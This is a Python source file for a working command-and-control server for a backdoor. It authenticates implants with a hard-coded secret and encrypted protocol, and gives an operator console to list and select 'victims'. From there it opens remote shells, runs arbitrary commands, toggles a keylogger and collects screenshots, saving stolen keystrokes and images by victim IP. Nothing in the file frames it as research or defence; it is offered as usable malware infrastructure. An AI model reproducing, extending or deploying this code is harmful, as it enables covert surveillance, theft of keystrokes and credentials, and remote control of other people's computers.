import asyncio
import json
import base64
import os
import time
import random
import logging
from cryptography.fernet import Fernet
from enum import Enum

# ================== CONFIG ==================
HOST = "0.0.0.0"
PORT = 4444
KEY = b"gakvPDU9FEqe1acqhNAayt97YNkX0LMH4fSQ2s_9ah0="
AUTH_SECRET = "supersecretkey123"  # Must match the backdoor
cipher = Fernet(KEY)

os.makedirs("Screenshots", exist_ok=True)
os.makedirs("Keylogs", exist_ok=True)

# Logging setup (ASCII arrows to avoid console encoding issues)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("c2_server.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("C2Server")

# Message types (kept for reference; not used directly)
MSG_TYPES = {
    "command": 0x01,
    "response": 0x02,
    "log": 0x03,
    "screenshot": 0x04,
    "ping": 0x05,
    "pong": 0x06,
    "auth": 0x07,
    "auth_ok": 0x08,
    "auth_fail": 0x09
}

HEARTBEAT_INTERVAL = 30
RECV_TIMEOUT = 60  # seconds – longer than heartbeat interval

class ConnState(Enum):
    IDLE = 0
    SHELL = 1
    WAITING = 2

clients = {}          # writer -> client_data
clients_lock = asyncio.Lock()
pending_responses = {}  # (writer, tid) -> asyncio.Future

# ================== PROTOCOL LAYER ==================
def encrypt(data):
    return cipher.encrypt(data.encode())

def decrypt(data):
    try:
        return cipher.decrypt(data).decode()
    except:
        return None

async def send_json(writer, msg):
    payload = json.dumps(msg)
    encrypted = encrypt(payload)
    writer.write(len(encrypted).to_bytes(4, 'big') + encrypted)
    await writer.drain()

async def recv_json(reader):
    try:
        length_bytes = await asyncio.wait_for(reader.readexactly(4), timeout=RECV_TIMEOUT)
        length = int.from_bytes(length_bytes, 'big')
        encrypted = await asyncio.wait_for(reader.readexactly(length), timeout=RECV_TIMEOUT)
        payload = decrypt(encrypted)
        if payload is None:
            return None
        return json.loads(payload)
    except (asyncio.TimeoutError, asyncio.IncompleteReadError, json.JSONDecodeError):
        return None

# ================== CLIENT HANDLER ==================
async def client_handler(reader, writer):
    """Connection handler – receives reader and writer; gets address from writer."""
    addr = writer.get_extra_info('peername')
    ip = addr[0] if addr else "unknown"
    logger.info(f"New connection from {ip}")

    # Authentication
    auth_msg = await recv_json(reader)
    if not auth_msg or auth_msg.get("type") != "auth" or auth_msg.get("secret") != AUTH_SECRET:
        logger.warning(f"Authentication failed from {ip}")
        await send_json(writer, {"type": "auth_fail", "data": "Invalid secret"})
        writer.close()
        await writer.wait_closed()
        return

    await send_json(writer, {"type": "auth_ok"})
    logger.info(f"Authenticated {ip}")

    # Store client data
    async with clients_lock:
        clients[writer] = {
            "addr": ip,
            "state": ConnState.IDLE,
            "last_heartbeat": time.time(),
            "reader": reader,
            "writer": writer
        }

    # Start heartbeat monitor
    asyncio.create_task(heartbeat_monitor(writer))

    # Main receive loop
    try:
        while True:
            msg = await recv_json(reader)
            if msg is None:
                break

            msg_type = msg.get("type")
            if msg_type == "pong":
                async with clients_lock:
                    if writer in clients:
                        clients[writer]["last_heartbeat"] = time.time()
                continue

            elif msg_type == "response":
                tid = msg.get("tid")
                if tid is not None:
                    future = pending_responses.get((writer, tid))
                    if future and not future.done():
                        future.set_result(msg.get("data"))
                continue

            elif msg_type == "log":
                data = msg.get("data")
                if data and data.startswith("KEYLOG:"):
                    log_data = data[7:]
                    with open(f"Keylogs/keylog_{ip}.txt", "a", encoding="utf-8") as f:
                        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {log_data}\n")
                    logger.info(f"Keylog from {ip}")

            elif msg_type == "screenshot":
                data = msg.get("data")
                if data and data.startswith("SCREENSHOT:"):
                    img_b64 = data[11:]
                    filename = f"Screenshots/screenshot_{ip}_{int(time.time())}.jpg"
                    with open(filename, "wb") as f:
                        f.write(base64.b64decode(img_b64))
                    logger.info(f"Screenshot saved from {ip} -> {filename}")

            else:
                logger.warning(f"Unknown message type from {ip}: {msg_type}")

    except Exception as e:
        logger.error(f"Error with {ip}: {e}")
    finally:
        async with clients_lock:
            clients.pop(writer, None)
        for (w, tid), fut in list(pending_responses.items()):
            if w == writer:
                fut.cancel()
                del pending_responses[(w, tid)]
        writer.close()
        await writer.wait_closed()
        logger.info(f"Disconnected {ip}")

async def heartbeat_monitor(writer):
    while True:
        await asyncio.sleep(HEARTBEAT_INTERVAL)
        async with clients_lock:
            client = clients.get(writer)
            if not client:
                break
            if time.time() - client["last_heartbeat"] > HEARTBEAT_INTERVAL + 5:
                logger.warning(f"Heartbeat timeout for {client['addr']}, closing")
                writer.close()
                break
            try:
                await send_json(writer, {"type": "ping"})
            except:
                break

# ================== COMMAND SENDER ==================
async def send_command(writer, cmd, data=None, timeout=30):
    tid = random.randint(1, 2**32)
    future = asyncio.get_event_loop().create_future()
    async with clients_lock:
        pending_responses[(writer, tid)] = future
    try:
        msg = {"type": "command", "tid": tid, "command": cmd}
        if data is not None:
            msg["data"] = data
        await send_json(writer, msg)
        result = await asyncio.wait_for(future, timeout)
        return result
    except asyncio.TimeoutError:
        raise
    finally:
        async with clients_lock:
            pending_responses.pop((writer, tid), None)

# ================== CONSOLE ==================
async def console_interface():
    loop = asyncio.get_event_loop()
    while True:
        try:
            cmd = await loop.run_in_executor(None, input, "C2> ")
            if not cmd:
                continue

            parts = cmd.split()
            if parts[0].lower() == "list":
                async with clients_lock:
                    if not clients:
                        print("No victims connected.")
                    else:
                        for i, (writer, data) in enumerate(clients.items(), 1):
                            print(f"{i}. {data['addr']} (state: {data['state'].name})")
                continue

            elif parts[0].lower() == "select":
                if len(parts) < 2:
                    print("Usage: select <number>")
                    continue
                try:
                    num = int(parts[1]) - 1
                    async with clients_lock:
                        if 0 <= num < len(clients):
                            selected_writer = list(clients.keys())[num]
                            globals()['selected'] = selected_writer
                            print(f"[+] Now controlling: {clients[selected_writer]['addr']}")
                        else:
                            print("Invalid selection.")
                except:
                    print("Invalid number.")
                continue

            selected = globals().get('selected')
            if not selected:
                print("No victim selected. Use 'select <number>' first.")
                continue

            async with clients_lock:
                client = clients.get(selected)
                if not client:
                    print("Selected client disconnected.")
                    globals()['selected'] = None
                    continue

            if parts[0].lower() == "shell":
                client["state"] = ConnState.SHELL
                print("[+] Shell opened. Type 'exit' to return.")
                while client["state"] == ConnState.SHELL:
                    shell_cmd = await loop.run_in_executor(None, input, "shell> ")
                    if shell_cmd.lower() == "exit":
                        await send_command(selected, "exit")
                        client["state"] = ConnState.IDLE
                        break
                    try:
                        result = await send_command(selected, "shell", data=shell_cmd, timeout=60)
                        if result:
                            print(result)
                    except asyncio.TimeoutError:
                        print("Command timed out.")
                continue

            elif parts[0].lower() == "screenshot":
                try:
                    result = await send_command(selected, "screenshot", timeout=30)
                    print(result if result else "Screenshot taken.")
                except asyncio.TimeoutError:
                    print("Screenshot request timed out.")

            elif parts[0].lower() == "keylogger":
                try:
                    result = await send_command(selected, "keylogger", timeout=10)
                    print(result if result else "Keylogger toggled.")
                except asyncio.TimeoutError:
                    print("Keylogger command timed out.")

            elif parts[0].lower() == "sysinfo":
                try:
                    result = await send_command(selected, "sysinfo", timeout=10)
                    print(result if result else "System info retrieved.")
                except asyncio.TimeoutError:
                    print("Sysinfo command timed out.")

            elif parts[0].lower() == "exit":
                print("Shutting down...")
                break

            else:
                try:
                    result = await send_command(selected, "exec", data=cmd, timeout=30)
                    if result:
                        print(result)
                except asyncio.TimeoutError:
                    print("Command timed out.")

        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")

# ================== MAIN ==================
async def main():
    server = await asyncio.start_server(client_handler, HOST, PORT)
    logger.info(f"C2 Listener running on {HOST}:{PORT}")
    logger.info("Screenshots -> Screenshots folder")
    logger.info("Keylogs    -> Keylogs folder")
    asyncio.create_task(console_interface())
    async with server:
        await server.serve_forever()

if __name__ == "__main__":
    asyncio.run(main())